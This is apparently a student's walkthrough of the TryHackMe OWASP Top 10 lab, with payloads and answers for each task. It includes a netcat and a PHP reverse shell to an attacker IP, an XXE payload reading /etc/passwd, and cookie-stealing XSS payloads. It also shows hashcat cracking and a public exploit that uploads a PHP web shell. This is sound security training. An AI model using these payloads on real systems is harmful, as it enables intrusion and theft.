# OWASP Top 10

room:https://tryhackme.com/room/owasptop10

### Task 3 [Severity 1] Injection

Injection flaws are very common in applications today. These flaws occur because user controlled input is interpreted as actual commands or parameters by the application. Injection attacks depend on what technologies are being used and how exactly the input is interpreted by these technologies. Some common examples include:

- SQL Injection: This occurs when user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. 
- Command Injection: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.

The main defence for preventing injection attacks is ensuring that user controlled input is not interpreted as queries or commands. There are different ways of doing this:

- Using an allow list: when input is sent to the server, this input is compared to a list of safe input or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected and the application throws an error.
- Stripping input: If the input contains dangerous characters, these characters are removed before they are processed.

### Task 4 [Severity 1] OS Command Injection

Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine. It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server. Sometimes this won't always end in something malicious, like a `whoami` or just reading of files. That isn't too bad. But the thing about command injection is it opens up many options for the attacker. The worst thing they could do would be to spawn a reverse shell to become the user that the web server is running as. A simple `;nc -e /bin/bash` is all that's needed and they own your server; **some variants of netcat don't support the -e option.** You can use a list of [these](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md) reverse shells as an alternative. 

Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and start looking for ways to pivot around. Now that we know what command injection is, we'll start going into the different types and how to test for them.

### Task 5 [Severity 1] Command Injection Practical

Commands to try

Linux:

```
whoami
id
ifconfig/ip addr
uname -a
ps -ef
```


Windows:

```
whoami
ver
ipconfig
tasklist
netstat -an
```


![KcGizdo](https://user-images.githubusercontent.com/115979342/215329340-532eadac-f324-4a94-8e52-f98abeab54b5.png)



First use the command `ls -al` to list the contents of the current directory 

                    total 28
    drwxr-x--- 4 www-data www-data 4096 Jun  3  2020 .
    drwxr-xr-x 3 root     root     4096 May 18  2020 ..
    drwxr-x--- 2 www-data www-data 4096 May 21  2020 css
    -rw-r----- 1 www-data www-data   17 May 22  2020 drpepper.txt
    -rw-r----- 1 www-data www-data 1723 May 26  2020 evilshell.php
    -rw-r----- 1 www-data www-data 2200 May 21  2020 index.php
    drwxr-x--- 2 www-data www-data 4096 May 21  2020 js
##### What strange text file is in the website root directory?

ANSWER:drpepper.txt

useful shell:

https://highon.coffee/blog/reverse-shell-cheat-sheet/

```
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");
```

```
$ nc -lvp 80               
listening on [any] 80 ...
10.10.221.205: inverse host lookup failed: Unknown host
connect to [10.2.4.98] from (UNKNOWN) [10.10.221.205] 48502
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

tried /etc/shadow but permission deinied

so try the /etc/passwd

```
$ cat /etc/shadow
cat: /etc/shadow: Permission denied
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
......
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
......
```

##### How many non-root/non-service/non-daemon users are there?

ANSWER:0

##### What user is this app running as?

ANSWER:www-data

##### What is the user's shell set as?

[Understanding /etc/passwd File Format](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)

![passwd-file-791527](https://user-images.githubusercontent.com/115979342/215329419-7307a266-0f8c-4d8d-8b8b-83863f0c659e.png)


7.`Command/shell`: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to /sbin/nologin and the user tries to log in to the Linux system directly, the /sbin/nologin shell closes the connection.

so cuz `www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`

ANSWER:/usr/sbin/nologin

##### What version of Ubuntu is running?

The `lsb_release -a` command shows  details about Linux distribution.

```
$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic
```

ANSWER:18.04.4

##### Print out the MOTD. What favorite beverage is shown?

```
$ cat /etc/update-motd.d/00-header
#!/bin/sh
......
printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

** ****** MAKES THE WORLD TASTE BETTER!
```

ANSWER:*

### Task 6 [Severity 2] Broken Authentication

If an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other users’ accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include:

- Brute force attacks: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts. 
- Use of weak credentials: web applications should set strong password policies. If applications allow users to set passwords such as ‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without brute forcing and without multiple attempts.
- Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts. 

There can be various mitigation for broken authentication mechanisms depending on the exact flaw:

- To avoid password guessing attacks, ensure the application enforces a strong password policy. 
- To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute force attacks.
- Implement Multi Factor Authentication - If a user has multiple methods of authentication, for example, using username and passwords and receiving a code on their mobile device, then it would be difficult for an attacker to get access to both credentials to get access to their account.

### Task 7  [Severity 2] Broken Authentication Practical

 this is cuz developers forgets to sanitize the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection.

##### What is the flag that you found in darren's account?

 register a user name darren, you'll see that user already exists so then try to register a user " darren"(notice the space)and you'll see that you are now logged in and will be able to see the content present only in Darren's account which in our case is the flag that you need to retrieve.

ANSWER:*

Now try to do the same trick and see if you can login as arthur.

use the same way 

arthur has registered but " arthur" can work

##### What is the flag that you found in arthur's account?

ANSWER:*

### Task 8 [Severity 3] Sensitive Data Exposure (Introduction)

When a webapp accidentally divulges sensitive data, we refer to it as "Sensitive Data Exposure". This is often data directly linked to customers (e.g. names, dates-of-birth, financial information, etc), but could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a "Man in The Middle Attack", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information (if the data is even encrypted in the first place...). 

### Task 9 [Severity 3] Sensitive Data Exposure (Supporting Material 1)

briefly cover some of the syntax we would use to query a flat-file database.

The most common (and simplest) format of flat-file database is an *sqlite* database. These can be interacted with in most programming languages, and have a dedicated client for querying them on the command line. This client is called "*sqlite3*", and is installed by default on Kali.

Let's suppose we have successfully managed to download a database:

![tmRhcRE](https://user-images.githubusercontent.com/115979342/215329494-566778db-9fd3-46b1-9375-e3053c921d51.png)

We can see that there is an SQlite database in the current folder.

To access it we use: `sqlite3 `:

![KJHAdI3](https://user-images.githubusercontent.com/115979342/215329509-c5478e24-f053-4ab6-ba9e-68b60db2781a.png)

From here we can see the tables in the database by using the `.tables` command:

![kyIWl1q](https://user-images.githubusercontent.com/115979342/215329522-60d79124-a7fd-4ec5-8842-3f4d0639881c.png)


At this point we can dump all of the data from the table, but we won't necessarily know what each column means unless we look at the table information. First let's use `PRAGMA table_info(customers);` to see the table information, then we'll use `SELECT * FROM customers;` to dump the information from the table:

![wVvHk7a](https://user-images.githubusercontent.com/115979342/215329571-a4859442-f362-4b76-8180-5dc24c444e51.png)


### Task 10 [Severity 3] Sensitive Data Exposure (Supporting Material 2)

When it comes to hash cracking, Kali comes pre-installed with various tools -- if you know how to use these then feel free to do so; however, they are outwith the scope of this material.

Instead we will be using the online tool: [Crackstation](https://crackstation.net/). This website is extremely good at cracking weak password hashes. For more complicated hashes we would need more sophisticated tools; however, all of the crackable password hashes used in today's challenge are weak MD5 hashes, which Crackstation should handle very nicely indeed.

or use hashcat

`hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt`

### Task 11 [Severity 3] Sensitive Data Exposure (Challenge)

##### What is the name of the mentioned directory?

use gobuster:

```
$ gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/common.txt -t 50 

/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/api                  (Status: 301) [Size: 312] 
/assets               (Status: 301) [Size: 315]
/console              (Status: 301) [Size: 316]
/favicon.ico          (Status: 200) [Size: 146077]
/index.php            (Status: 200) [Size: 1777]
/login                (Status: 301) [Size: 314] 
/server-status        (Status: 403) [Size: 278]
```

ANSWER: /assets 

##### Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?

![image-20230105224045816](https://user-images.githubusercontent.com/115979342/215329596-3e21c665-a4d8-4407-b66f-a00a2518e4d2.png)


ANSWER: webapp.db 

##### Use the supporting material to access the sensitive data. What is the password hash of the admin user?

 `wget http://MACHINE_IP/assets/webapp.db`  

```
$ sqlite3 webapp.db                                            
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|*|1
23023b67a32488588db1e28579ced7ec|Bob|*|1
4e8423b514eef575394ff78caed3254d|Alice|*|0
sqlite> 
```

ANSWER: *

Crack the hash.

##### What is the admin's plaintext password?

use the tool https://crackstation.net/

ANSWER: *

##### Login as the admin. What is the flag?

ANSWER: *

### Task 12 [Severity 4] XML External Entity

An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.

There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

### Task 13 [Severity 4 XML External Entity - eXtensible Markup Language

##### What is XML?

XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data. 

##### Syntax

```
Every XML document mostly starts with what is known as XML Prolog.

<?xml version="1.0" encoding="UTF-8"?>


Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.

Every XML document must contain a `ROOT` element. For example:

<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>


In the above example the <mail> is the ROOT element of that document and <to>, <from>, <subject>, <text> are the children elements. If the XML document doesn't have any root element then it would be consideredwrong or invalid XML doc.

Another thing to remember is that XML is a case sensitive language. If a tag starts like <to> then it has to end by </to> and not by something like </To>(notice the capitalization of T)

Like HTML we can use attributes in XML too. The syntax for having attributes is also very similar to HTML. For example:
<text category = "message">You need to learn about XXE</text>

In the above example category is the attribute name and message is the attribute value.
```

##### Full form of XML

ANSWER: extensible markup language

##### Is it compulsory to have XML prolog in XML documents?

ANSWER: no

##### Can we validate XML documents against a schema?

ANSWER: yes

##### How can we specify XML version and encoding in XML document?

ANSWER: xml prolog

### Task 14 [Severity 4] XML External Entity - DTD

Before we move on to start learning about XXE we'll have to understand what is DTD in XML.

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.

Let us try to understand this with the help of an example. Say we have a file named `note.dtd` with the following content:

 

```
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```

Now we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.

Ex: Below is given an XML document that uses `note.dtd`

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
  <to>falcon</to>
  <from>feast</from>
  <heading>hacking</heading>
  <body>XXE attack</body>
</note>
```



So now let's understand how that DTD validates the XML. Here's what all those terms used in `note.dtd` mean

- !DOCTYPE note - Defines a root element of the document named **note**
- !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
- !ELEMENT to - Defines the `to` element to be of type "#PCDATA"
- !ELEMENT from - Defines the `from` element to be of type "#PCDATA"
- !ELEMENT heading - Defines the `heading` element to be of type "#PCDATA"
- !ELEMENT body - Defines the `body` element to be of type "#PCDATA"

  **NOTE**: #PCDATA means parseable character data.

##### How do you define a new ELEMENT?

ANSWER: !ELEMENT

##### How do you define a ROOT element?

ANSWER: !DOCTYPE

##### How do you define a new ENTITY?

ANSWER: !ENTITY

### Task 15 [Severity 4] XML External Entity - XXE Payload

Now we'll see some XXE payload and see how they are working.

1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.

```
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```


As we can see we are defining a `ENTITY` called `name` and assigning it a value `feast`. Later we are using that ENTITY in our code.

2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Here again, we are defining an ENTITY with the name `read` but the difference is that we are setting it value to `SYSTEM` and path of the file.

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file `/etc/passwd`.

In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.

### Task 16 [Severity 4] XML External Entity - Exploiting



##### What is the name of the user in /etc/passwd

payload:

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

ANSWER: the last line of the file

##### Where is falcon's SSH key located?

ANSWER: user home directory plus `/.ssh/id_rsa`

##### What are the first 18 characters for falcon's private key

ANSWER: *

### Task 17 [Severity 5] Broken Access Control

A regular visitor being able to access protected pages, can lead to the following:

- Being able to view sensitive information
- Accessing unauthorized functionality

OWASP have a listed a few attack scenarios demonstrating access control weaknesses:

**Scenario #1:** The application uses unverified data in a SQL call that is accessing account information:

```
pstmt.setString(1, request.getParameter("acct"));

ResultSet results = pstmt.executeQuery( );
```

An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.

http://example.com/app/accountInfo?acct=notmyacct

**Scenario #2:** An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.

http://example.com/app/getappInfo

http://example.com/app/admin_getappInfo

### Task 18 [Severity 5] Broken Access Control (IDOR Challenge)

IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this https://example.com/bank?account_number=1234. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.

There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.

##### Look at other users notes. What is the flag?

After logging in with noot, I found that the url has `note.php?note=1`
Try changing it to `note=0` to get the flag

ANSWER: *

### Task 19 [Severity 6] Security Misconfiguration

Security misconfigurations include:

- Poorly configured permissions on cloud services, like S3 buckets
- Having unnecessary features enabled, like services, pages, accounts or privileges
- Default accounts with unchanged passwords
- Error messages that are overly detailed and allow an attacker to find out more about the system
- Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/), or revealing too much detail in the Server: HTTP header

##### Hack into the webapp, and find the flag!

Googling Pensive Notes and discover its github source code
The md file contains default credentials

Use that login and get the flag

### Task 20 [Severity 7] Cross-site Scripting

Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.

A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:

1. **Stored XSS** - the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
2. **Reflected XSS** - the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
3. **DOM-Based XSS** - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.

For more XSS explanations and exercises, check out the [XSS room](https://tryhackme.com/room/xss).

## **XSS Payloads**

Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious Javascript on a victim’s machine. Check out some common payloads types used:

- Popup's (`<script>alert(“Hello World”)</script>`) - Creates a Hello World message popup on a users browser.
- Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
- XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
- Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).

XSS-Payloads.com (http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.

##### Navigate to [http://MACHINE_IP/](http://10.10.19.225/) in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".

payload:`<script>alert(“Hello World”)</script>`

ANSWER: *

##### On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.

cuz the hint In Javascript `window.location.hostname` will show your hostname, in this case your deployed machine's hostname will be its IP.

so change the "hello" to  `window.location.hostname` .

payload:`<script>alert(window.location.hostname)</script>`

 ANSWER: *

##### Now navigate to [http://MACHINE_IP/](http://10.10.19.225/) in your browser and click on the "Stored XSS" tab on the navbar; make an account.

##### Then add a comment and see if you can insert some of your own HTML.

payload:`<html>document.write("Hello World!");<html>`

ANSWER: *

##### On the same page, create an alert popup box appear on the page with your document cookies.

Google browsing found useful information:https://www.softwaretestinghelp.com/cross-site-scripting-xss-attack-test/

payload:`<script>alert(document.cookie)</script>`

ANSWER: *

##### Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

payload:`<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`

ANSWER: *

### Task 21 [Severity 8] Insecure Deserialization

Simply, insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.

##### Who developed the Tomcat application?

google

ANSWER: The Apache Software Foundation

##### What type of attack that crashes services can be performed with insecure deserialization?

ANSWER: Denial of Service

### Task 22 [Severity 8] Insecure Deserialization - Objects

﻿                                                   **Objects**

A prominent element of object-oriented programming (OOP), objects are made up of two things:

\- State

\- Behaviour

Simply, objects allow you to create similar lines of code without having to do the leg-work of writing the same lines of code again.

For example, a lamp would be a good object. Lamps can have different types of bulbs, this would be their state, as well as being either on/off - their behaviour!

##### Select the correct term of the following statement:
*if a dog was sleeping, would this be:*

A) A State
B) A Behaviour 

ANSWER: A Behaviour 

### Task 23 [Severity 8] Insecure Deserialization - Deserialization


Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.

Alternatively, deserialisation is the reverse of this; converting serialised information into their complex form - an object that the application will understand.

​                                  What does this mean?
Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialised back into "password123" so it can be stored.
*The process is best explained through diagrams:*

![img](E:/Typera_images/ZB76mLI.png)

**How can we leverage this?**
Simply, insecure deserialization occurs when data from an untrusted party (I.e. a hacker) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred.

##### What is the name of the base-2 formatting that data is sent across a network as? 

ANSWER: Binary

### Task 24 [Severity 8] Insecure Deserialization - Cookies

*Some cookies have additional attributes, a small list of these are below:*

| Attribute    | Description                                                  | Required? |
| ------------ | ------------------------------------------------------------ | --------- |
| Cookie Name  | The Name of the Cookie to be set                             | Yes       |
| Cookie Value | Value, this can be anything plaintext or encoded             | Yes       |
| Secure Only  | If set, this cookie will only be set over HTTPS connections  | No        |
| Expiry       | Set a timestamp where the cookie will be removed from the browser | No        |
| Path         | The cookie will only be sent if the specified URL is within the request |           |

Cookies can be set in various website programming languages. For example, Javascript, PHP or Python to name a few. The following web application is developed using Python's Flask, so it is fitting to use it as an example.

*Take the snippet below:*

![img](E:/Typera_images/9WOYwbF.png)

##### If a cookie had the path of *webapp.com/login* , what would the URL that the user has to visit be?

ANSWER:  webapp.com/login

##### What is the acronym for the web technology that *Secure* cookies work over?

search on google:https://www.techopedia.com/definition/25737/secure-cookie#:~:text=A%20secure%20cookie%2C%20also%20known,for%20scripting%20languages%20like%20JavaScript.

ANSWER: https

### Task 25 [Severity 8] Insecure Deserialization - Cookies Practical

![1LMFfV0](https://user-images.githubusercontent.com/115979342/215329637-e890dec2-0b23-496f-bbe5-aafbdfd2a87d.png)


create an account first

and find the cookie page

You will see here that there are cookies are both plaintext encoded and base64 encoded. The first flag will be found in one of these cookies.

Notice here that you have a cookie named "userType". You are currently a user, as confirmed by your information on the "myprofile" page. change"userType" value then find second flag.

### Task 26 [Severity 8] Insecure Deserialization - Code Execution

1. First, change the value of the userType cookie from "admin" to "user" and return to [http://MACHINE_IP/myprofile](http://machine_ip/myprofile) 

2. Then, left-click on the URL in "Exhange your vim" found in the screenshot below.
3.  Once you have done this, left-click on the URL in "Provide your feedback!"
4. Follow the prompts to get the target machine

```
$ find / -name "flag.txt" 2>/dev/null
/home/cmnatic/flag.txt
$ cat /home/cmnatic/flag.txt
```

### Task 27 [Severity 9] Components With Known Vulnerabilities - Intro

Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well documented vulnerability.

For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on [exploit-db](https://www.exploit-db.com/exploits/41962).

### Task 28 [Severity 9] Components With Known Vulnerabilities - Exploit



### Task 29 [Severity 9] Components With Known Vulnerabilities - Lab

exploits:https://www.exploit-db.com/exploits/47887

##### How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)

```
$ python3 47887.py  http://10.10.231.67/ 
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.231.67/bootstrap/img/TfcT1j7Vfv.php
> Example command usage: http://10.10.231.67/bootstrap/img/TfcT1j7Vfv.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ whoami
www-data

RCE $ wc -c /etc/passwd
** /etc/passwd

RCE $ 

```

ANSWER: **

### Task 30 [Severity 10] Insufficient Logging and Monitoring

When web applications are set up, every action performed by the user should be logged. Logging is important because in the event of an incident, the attackers actions can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions an attacker performed if they gain access to particular web applications. The bigger impacts of these include:

- regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, not only are users of the application affected, but the application owners may be subject to fines or more severe actions depending on regulations.
- risk of further attacks: without logging, the presence of an attacker may be undetected. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

The information stored in logs should include:

- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses

##### What IP address is the attacker using?

find in the login file

ANSWER: *

##### What kind of attack is being carried out?

ANSWER: brute force
